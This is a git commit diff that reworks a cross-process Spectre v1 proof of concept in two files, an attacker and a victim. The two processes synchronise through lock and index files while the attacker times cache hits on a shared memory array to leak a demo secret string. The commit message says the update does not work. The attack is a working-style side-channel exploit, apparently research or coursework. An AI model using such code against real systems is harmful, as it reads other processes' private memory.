382fae7508dacf3e04ac4de8cda0e10ddc01b79b
Stefan Radu <stefan270101@gmail.com>
2022-05-02 00:22:42 +0300

    update doesn't work

--- spectre/cross_process/attack.c
+++ spectre/cross_process/attack.c
@@ -4,6 +4,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <sys/file.h>
 #include <errno.h>
 #ifdef _MSC_VER
 #include <intrin.h>        /* for rdtscp and clflush */
@@ -15,14 +16,85 @@
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (110)  /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */
 
 uint8_t *array2;
 unsigned int array1_size = 16;
 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 
+const char *lock_file_name = "spectre.lock";
+const char *shared_name = "shared_file";
+const char *index_file_name = "index.txt";
+int fd_lock, shared_fd;
+
+int results[256];
+
+void train(int train_amount) {
+	for (int i = 0; i < train_amount; ++i) {
+		// acquire lock
+		int locked = -1;
+		while (locked != 0) {
+			fd_lock = open(lock_file_name, O_CREAT);
+			locked = flock(fd_lock, LOCK_EX);
+		}
+
+		FILE *f = fopen(index_file_name, "w");
+		fprintf(f, "%d", i % 16);
+		fclose(f);
+
+		// release lock
+		unlink(lock_file_name);
+		flock(fd_lock, LOCK_UN);
+		close(fd_lock);
+
+		// wait to be deleted
+		while (access(index_file_name, F_OK) != -1);
+	}
+}
+
+void read_index(int index) {
+	static int tries, i, reading, j, k, mix_i;
+	static unsigned junk = 0;
+	static size_t training_x, x;
+	register uint64_t time1, time2;
+	static volatile uint8_t *addr;
+
+	// acquire lock
+	int locked = -1;
+	while (locked != 0) {
+		fd_lock = open(lock_file_name, O_CREAT);
+		locked = flock(fd_lock, LOCK_EX);
+	}
+
+	FILE *f = fopen(index_file_name, "w");
+	fprintf(f, "%d", index);
+	fclose(f);
+
+	for (i = 0; i < 256; i++)
+		_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */
+
+	// release lock
+	unlink(lock_file_name);
+	flock(fd_lock, LOCK_UN);
+	close(fd_lock);
+
+	while (access(index_file_name, F_OK) != -1);
+
+	/* Time reads. Order is lightly mixed up to prevent stride prediction */
+	for (i = 0; i < 256; i++) {
+		mix_i = ((i * 167) + 13) & 255;
+		addr = &array2[mix_i * 512];
+		time1 = __rdtscp(&junk);            /* READ TIMER */
+		junk = *addr;                       /* MEMORY ACCESS TO TIME */
+		time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
+		if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+			results[mix_i]++;  /* cache hit - add +1 to score for this j */
+	}
+}
+
 int main() {
-	int fd = open("./shared_file", O_RDONLY);
+	// map share memory area to array2 (cache side channel)
+	int fd = open(shared_name, O_RDONLY);
 	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ, MAP_SHARED, fd, 0);
 
 	if (array2 == MAP_FAILED) {
@@ -30,60 +102,55 @@ int main() {
 		return 0;
 	}
 
-	static int results[256];
-	int tries, i, reading, j, last_value, k, mix_i;
+	int tries, i, reading, j, k, mix_i, printed = 0;
 	unsigned junk = 0;
 	size_t training_x, x;
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
-	/* Time reads. Order is lightly mixed up to prevent stride prediction */
 
-	int printed = 0;
-	for (reading = 1; ; ++reading) {
+	const int MAX_READINGS = 200;
+	const int TRAIN_AMOUNT = 7;
+
+	int offset = 0;
+	while (1) {
+		// flush results
+		for (i = 0; i < 256; ++i) {
+			results[i] = 0;
+		}
+
+		for (reading = 1; reading < MAX_READINGS; ++reading) {
+			train(TRAIN_AMOUNT);
+			read_index(offset);
+		}
+
+		j = k = -1;
 		for (i = 0; i < 256; i++) {
-			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk);            /* READ TIMER */
-			junk = *addr;                       /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-				results[mix_i]++;  /* cache hit - add +1 to score for this j */
+			if (j < 0 || results[i] >= results[j]) {
+				k = j;
+				j = i;
+			} else if (k < 0 || results[i] >= results[k]) {
+				k = i;
+			}
 		}
-			/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < 256; i++)
-			_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */
 
-		/* Locate highest & second-highest results results tallies in j/k */
-		if (reading % 1 == 0) {
-			j = k = -1;
-			for (i = 0; i < 256; i++) {
-				if (j < 0 || results[i] >= results[j]) {
-					k = j;
-					j = i;
-				} else if (k < 0 || results[i] >= results[k]) {
-					k = i;
-				}
-			}
-
-			results[0] ^= junk;  /* use junk so code above won't get optimized out*/
-			if (j != last_value && j > 31 && j < 127) {
-			/* if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) { */
-				/* printf("%c", (j > 31 && j < 127 ? j : '.')); */
-				printf("%c", j);
-				printed += 1;
-				fflush(stdout);
-				if (printed % 0x50 == 0) {
-					printf("\n");
-				}
-				last_value = j;
-			}
-
-			reading = 1;
-			for (int i = 0; i < 256; ++i) {
-				/* printf("%d ", results[i]); */
-				results[i] = 0;
-			}
-			/* printf("\n"); */
+		printf("%c", j);
+		printed += 1;
+		fflush(stdout);
+		if (printed % 0x50 == 0) {
+			printf("\n");
 		}
+
+		/* if (j > 31 && j < 127) { */
+		/* #<{(| if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) { |)}># */
+		/* 	#<{(| printf("%c", (j > 31 && j < 127 ? j : '.')); |)}># */
+		/* 	printf("%c", j); */
+		/* 	printed += 1; */
+		/* 	fflush(stdout); */
+		/* 	if (printed % 0x50 == 0) { */
+		/* 		printf("\n"); */
+		/* 	} */
+		/* } */
+
+		++offset;
 	}
 }
--- spectre/cross_process/victim.c
+++ spectre/cross_process/victim.c
@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/mman.h>
+#include <sys/file.h>
 #include <errno.h>
 #ifdef _MSC_VER
 #include <intrin.h>        /* for rdtscp and clflush */
@@ -15,6 +16,8 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
+int fd_lock;
+
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
@@ -22,6 +25,9 @@ uint8_t unused2[64];
 uint8_t *array2;
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
+const char *lock_file_name = "spectre.lock";
+const char *shared_name = "shared_file";
+const char *index_file_name = "index.txt";
 
 void victim_function(size_t x) {
 	static uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
@@ -38,19 +44,19 @@ Analysis code
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x) {
-	static int results[256];
-	int tries, i, j, k, mix_i;
-	unsigned junk = 0;
-	size_t training_x, x;
-	register uint64_t time1, time2;
-	volatile uint8_t *addr;
+	/* static int results[256]; */
+	/* int tries, i, j, k, mix_i; */
+	/* unsigned junk = 0; */
+	/* size_t training_x, x; */
+	/* register uint64_t time1, time2; */
+	/* volatile uint8_t *addr; */
 
-	for (i = 0; i < 256; i++)
-		results[i] = 0;
+	/* for (i = 0; i < 256; i++) */
+	/* 	results[i] = 0; */
 	/* for (tries = 999; tries > 0; tries--) { */
 
 	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-	training_x = tries % array1_size;
+	/* training_x = tries % array1_size; */
 	/* for (j = 100; j >= 0; j--) { */
 	/* 	_mm_clflush(&array1_size); */
 	/* 	for (volatile int z = 0; z < 100; z++) {}  #<{(| Delay (can also mfence) |)}># */
@@ -65,18 +71,47 @@ void readMemoryByte(size_t malicious_x) {
 	/* 	victim_function(x); */
 	/* } */
 	/* } */
-	for (j = 0; j < 16; ++j) {
-		_mm_clflush(&array1_size);
-		for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
-		victim_function(j);
+	/* for (j = 0; j < 16; ++j) { */
+	/* 	_mm_clflush(&array1_size); */
+	/* 	for (volatile int z = 0; z < 100; z++) {}  #<{(| Delay (can also mfence) |)}># */
+	/* 	victim_function(j); */
+	/* } */
+
+	// acquire lock
+	static int offset, locked;
+
+	// wait to appear
+	while (access(index_file_name, F_OK) == -1);
+
+	locked = -1;
+	while (locked != 0) {
+		fd_lock = open(lock_file_name, O_CREAT);
+		locked = flock(fd_lock, LOCK_EX);
 	}
+
+	FILE *f = fopen(index_file_name, "r");
+	if (f == NULL) {
+		printf("nu exista offffff\n");
+		exit(0);
+	}
+
+	fscanf(f, "%d", &offset);
 	_mm_clflush(&array1_size);
 	for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
-	victim_function(malicious_x);
+	victim_function(malicious_x + offset);
+
+	fclose(f);
+	// remove file
+	remove(index_file_name);
+
+	// release lock
+	unlink(lock_file_name);
+	flock(fd_lock, LOCK_UN);
+	close(fd_lock);
 }
 
 int main(int argc, const char **argv) {
-	int fd = open("./shared_file", O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
+	int fd = open(shared_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
 	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	close(fd);
 
@@ -100,7 +135,10 @@ int main(int argc, const char **argv) {
 		return 0;
 	}
 
-	readMemoryByte(malicious_x + offset);
+	/* readMemoryByte(malicious_x + offset); */
+	while (1) {
+		readMemoryByte(malicious_x);
+	}
 
 	return 0;
 }
